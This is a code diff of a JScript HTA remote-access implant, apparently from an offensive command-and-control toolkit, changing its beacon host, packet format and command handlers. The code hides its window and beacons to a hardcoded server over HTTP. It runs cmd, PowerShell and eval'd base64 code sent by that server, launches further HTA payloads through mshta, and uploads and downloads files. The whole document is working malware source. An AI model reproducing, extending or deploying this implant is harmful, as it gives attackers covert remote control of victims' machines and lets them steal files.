@@ -5,20 +5,19 @@ window.blur();
 window.resizeTo(6, 9);
 
 //Define variables
-var ipp = "127.0.0.1"
+var ipp = "172.16.113.1"
 var p0rt= "8080"
 var uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
 var proto = "ht"+"tp"+":/"+"/"
 var home = proto+ipp+":"+p0rt+uri
-var sleepytime = 3000 //in milliseconds
+var sleepytime = 2000 //in milliseconds
 
 var useragent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
 var xFrameOptions = "SAMEORIGIN"
 var contentEncoding = "gzip"
 var contentType = "text/xml"
 
-var x = "iveXOb"
-eval("var runner = new Act"+x+"ject(\"WScr\" +   \"ipt.Sh\"+  \"ell\")")
+var runner = new ActiveXObject("WScript.Shell")
 
 var temp = runner.ExpandEnvironmentStrings("%TE" +"MP%");
 var cs = runner.ExpandEnvironmentStrings("%C"+  "OmSP"    +"Ec%");
@@ -28,11 +27,13 @@ var id = Math.floor(Math.random() * 9999999999).toString()
 var type = "hta"
 var fso = new ActiveXObject("Scripting.FileSystemObject")
 
+var runextra = false
+var extrafunc = []
+
 //Helper functions
 function post(home, response) {
   var res;
-  try
-  {
+  try {
     var WinHttpReq = new ActiveXObject( "WinHttp.WinHttpRequest.5.1" );
     WinHttpReq.Open("POST", home, false);
     //Set HTTP Headers
@@ -46,8 +47,7 @@ function post(home, response) {
     //Retrieve the response text.
     res = WinHttpReq.ResponseText;
   }
-  catch (objError)
-  {
+  catch (objError) {
     res = objError + "\n"
     res += "WinHTTP returned error: " + (objError.number & 0xFFFF).toString() + "\n\n";
     res += objError.description;
@@ -75,33 +75,33 @@ function quit() {
 }
 
 function writebinfile(filename, content) {
-        var stream = new ActiveXObject("ADODB.Stream")
-        stream.Open()
-        stream.Type = 1 //adTypeBinary
-        stream.Write(content)
-        stream.SaveToFile(filename)
-        stream.Close()
+  var stream = new ActiveXObject("ADODB.Stream")
+  stream.Open()
+  stream.Type = 1 //adTypeBinary
+  stream.Write(content)
+  stream.SaveToFile(filename)
+  stream.Close()
 }
 
 function readbinfile(filename) {
-	var stream = new ActiveXObject("ADODB.Stream")
-	stream.Open()
-	stream.Type = 1 //adTypeBinary
-	stream.LoadFromFile(filename)
-	var bytes = stream.Read()
-	stream.Close()
-	return bytes
+  var stream = new ActiveXObject("ADODB.Stream")
+  stream.Open()
+  stream.Type = 1 //adTypeBinary
+  stream.LoadFromFile(filename)
+  var bytes = stream.Read()
+  stream.Close()
+  return bytes
 }
 
 function str2bin(data) {
-   var istream = new ActiveXObject("ADODB.Stream");
-   istream.Type = 2
-   istream.CharSet = "us-ascii"
-   istream.Open()
-   istream.WriteText(data)
-   istream.Position = 0
-   istream.Type = 1
-   return istream.Read()
+  var istream = new ActiveXObject("ADODB.Stream");
+  istream.Type = 2
+  istream.CharSet = "us-ascii"
+  istream.Open()
+  istream.WriteText(data)
+  istream.Position = 0
+  istream.Type = 1
+  return istream.Read()
 }
 function b64e(data) {
   var xml = new ActiveXObject("MSXml2.DOMDocument");
@@ -140,124 +140,152 @@ function b64d(data, type) {
   }
 }
 
-function main()
-{
-  try
-  {
+var checkin = '{ "p":[ {"type": "'+type+'","id": '+id+',"un": "'+un+'","hn": "'+hn+'"} ] }'; //initial checkin
+function main() {
+  try {
     window.moveTo(-69, -420);
 
     var retval = ""
-    var checkin = '{"type": "'+type+'","id": '+id+',"un": "'+un+'","hn": "'+hn+'"}';
     var serverMsg = post(home, checkin);
-	  var jsondata = "{" + serverMsg.split("{")[1].split("\n")[0]
+    var jsondata = "{" + (serverMsg.split("{").slice(1)).join("{").split("\n")[0] // pull out json from http msg
     // Convert json string to json object
     eval("jsObject="+jsondata);
+    checkin = '{ "p":[ ' // start building json response string
 
-    if(jsObject.cmnd)
-    {
-      var rettype = "retval"
-      //kill
-      if(jsObject.cmnd == "quit") {
-        retval = "[*] Shutting down..."
-        quit()
-      }
-
-      else if(jsObject.cmnd.split(" ")[0] == "spawn") {
+    // Supports running extra functions once per loop ... right before checking for cmnd
+    if(runextra) {
+      for(var i in extrafunc) {
         try {
-          fd = fso.CreateTextFile(temp + "\\" + id + ".hta")
-          fd.WriteLine(b64d(jsObject.cmnd.split(" ")[1]))
-          fd.close()
-          runner.Run("ms" + "hta " + temp + "\\" + id + ".hta", 0, false)
-          for(var i = 0; i < 60000000; i++) {
-            // busy wait to wait for above cmnd to finish
-          }
-          fso.DeleteFile(temp + "\\" + id + ".hta")
-          retval = "[+] Spawn success..."
+          eval(extrafunc[i])
         }
         catch (e) {
-          retval = "[-] Spawn failed..."
         }
       }
+    }
 
-      else if((jsObject.cmnd.split(" ")[0] == "ev")) {
-        retval = eval(b64d(jsObject.cmnd.split(" ")[1]))
-      }
+    // loop thru all packages
+    var packages = jsObject.p
+    for(var p in packages) {
+      if(packages[p].id == id) { // if this is our package (id = our id)
+        if(packages[p].cmnd) {
+          var rettype = "retval"
+          var cmnd = packages[p].cmnd
 
-      else if((jsObject.cmnd.split(" ")[0] == "psh") || (jsObject.cmnd.split(" ")[0] == "cs") || (jsObject.cmnd.split(" ")[0] == "shc")) {
-        fd = fso.CreateTextFile(temp + "\\" + id + ".txt")
-        msb = jsObject.cmnd.split(" ")[1]
-        msbdata = b64d(jsObject.cmnd.split(" ")[2], "txt")
-        fd.WriteLine(msbdata)
-        fd.close()
-        if((jsObject.cmnd.split(" ")[0] == "shc")) {
-          runner.Run(msb + " " + temp + "\\" + id + ".txt", 0, true)
-          retval = "[*] Shc cmnd appeared successful"
-        }
-        else {
-          runner.Run(msb + " " + temp + "\\" + id + ".txt", 0, true)
-        }
-        if(fso.FileExists(temp + "\\__" + id + ".txt")) {
-          fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
-          retval = fd.ReadAll()
-          fd.close()
-          fso.DeleteFile(temp + "\\__" + id + ".txt", true)
-        }
-        if(fso.FileExists(temp + "\\" + id + ".txt")) {
-          fso.DeleteFile(temp + "\\" + id + ".txt", true)
-        }
-      }
-	  
-	  else if(jsObject.cmnd.split(" ")[0] == "dl") {
-	      var array = jsObject.cmnd.split(" ")
-		  array.shift() //Cuts off the first element in the array
-		  var filepath = array.join(" ")
-	      if(fso.FileExists(filepath)) {
-		    retval = readbinfile(filepath)
-		    rettype = "dl"
-		}
-		else {
-		  retval = "[!] Could not read file: " + filepath
-		}
-	  }
+          //kill
+          if(cmnd == "quit") {
+            quit();
+          }
+          
 
-                else if(jsObject.cmnd.split(" ")[0] == "up") {
-                  try {
-                    var array = jsObject.cmnd.split(" ")
-                    content = b64d(array[1], "bin")
-                    array.shift()
-                    array.shift()
-                    filename = array.join(" ")
-                    writebinfile(filename, content)
-                    retval = "[*] File uploaded: " + filename
-                  }
-                  catch (e) {
-                    retval = "[-] Could not upload file: " + filename
-                  }
-                }
+          //spawn: writes hta to %TEMP%
+          else if(cmnd.split(" ")[0] == "spawn") {
+            //try {
+              fd = fso.CreateTextFile(temp + "\\" + id + ".hta")
+              fd.WriteLine(b64d(cmnd.split(" ")[1]))
+              fd.close()
+              runner.Run("ms" + "hta " + temp + "\\" + id + ".hta", 0, false)
+              for(var i = 0; i < 60000000; i++) {
+                // busy wait to wait for above cmnd to finish
+              }
+              fso.DeleteFile(temp + "\\" + id + ".hta")
+              retval = "[+] Spawn success..."
+            //}
+            //catch (e) {
+            //  retval = "[-] Spawn failed..."
+            //}
+          }
 
-	    //credit to nate and 0sum
-	    else {
-        runner.Run(cs +" /q /c " + jsObject.cmnd + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
-		    if(fso.FileExists(temp + "\\__" + id + ".txt")) {
-                      try {
-		        fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
-                        retval = fd.ReadAll()
-		        fd.close()
-		        fso.DeleteFile(temp + "\\__" + id + ".txt", true)
-                      }
-                      catch (e) { }
-                    }
+          else if((cmnd.split(" ")[0] == "ev")) {
+            eval(b64d(cmnd.split(" ")[1]))
+            retval = "[*] eval complete..."
+          }
+
+          //psh and cs
+          else if((cmnd.split(" ")[0] == "psh") || (cmnd.split(" ")[0] == "cs") || (cmnd.split(" ")[0] == "shc")) {
+            fd = fso.CreateTextFile(temp + "\\" + id + ".txt")
+            msb = cmnd.split(" ")[1]
+            msbdata = b64d(cmnd.split(" ")[2], "txt")
+            fd.WriteLine(msbdata)
+            fd.close()
+            if(cmnd.split(" ")[0] == "shc") {
+              runner.Run(msb + " " + temp + "\\" + id + ".txt", 0, true)
+              retval = "[*] Shc cmnd appeared successful"
+            }
+            else {
+              runner.Run(msb + " " + temp + "\\" + id + ".txt", 0, true)
+            }
+            if(fso.FileExists(temp + "\\__" + id + ".txt")) {
+              fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
+              retval = fd.ReadAll()
+              fd.close()
+              fso.DeleteFile(temp + "\\__" + id + ".txt", true)
+            }
+            if(fso.FileExists(temp + "\\" + id + ".txt")) {
+              fso.DeleteFile(temp + "\\" + id + ".txt", true)
+            }
+          }
+
+          else if(cmnd.split(" ")[0] == "dl") {
+            var array = cmnd.split(" ")
+            array.shift() //Cuts off the first element in the array
+            var filepath = array.join(" ")
+            if(fso.FileExists(filepath)) {
+              retval = readbinfile(filepath)
+              rettype = "dl"
+            }
+            else {
+              retval = "[!] Could not read file: " + filepath
+            }
+          }
+
+          else if(cmnd.split(" ")[0] == "up") {
+            try {
+              var array = cmnd.split(" ")
+              content = b64d(array[1], "bin")
+              array.shift()
+              array.shift()
+              filename = array.join(" ")
+              writebinfile(filename, content)
+              retval = "[*] File uploaded: " + filename
+            }
+            catch (e) {
+              retval = "[-] Could not upload file: " + filename
+            }
+          }
+
+          else if(cmnd.split(" ")[0] == "ex") {
+            runner.Exec(b64d(cmnd.split(" ")[1]))
+            retval = "[*] Exec'd cmnd... (no output)"
+          }
+
+          //credit to nate and 0sum
+          else {
+            runner.Run(cs +" /c " + cmnd + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
+      	    if(fso.FileExists(temp + "\\__" + id + ".txt")) {
+              try {
+                fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
+                retval = fd.ReadAll()
+                fd.close()
+                fso.DeleteFile(temp + "\\__" + id + ".txt", true)
+              }
+              catch (e) { }
+            }
+          }
+          if(retval == "") {
+            retval = "[*] No results to return or error getting result data"
+          }
+          checkin += '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","hn":"'+hn+'","'+rettype+'":"'+b64e(retval)+'"} ] }';
+          packages[p].cmnd = "" // set cmnd to blank so we don't accidentally run the same thing twice ...
+        }
+
+        else { // cmnd is blank
+          checkin += '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","hn":"'+hn+'"} ] }'; // idle response
+        }
       }
-      if(retval == "") {
-        retval = "[*] No results to return or error getting result data"
-      }
-      var resp = '{"type": "'+type+'", "id": '+id+', "un":"'+un+'", "hn":"'+hn+'", "'+rettype+'":"'+b64e(retval)+'"}';
-      jsObject.cmnd = ""
-      post(home, resp)
     }
   }
   catch (e) {
-    window.setTimeout("main()", sleepytime, "JScript")
+    checkin = '{ "p":[ {"type": "'+type+'","id": '+id+',"un": "'+un+'","hn": "'+hn+'"} ] }'; //error - set idle checkin
   }
   window.setTimeout("main()", sleepytime, "JScript")
 }
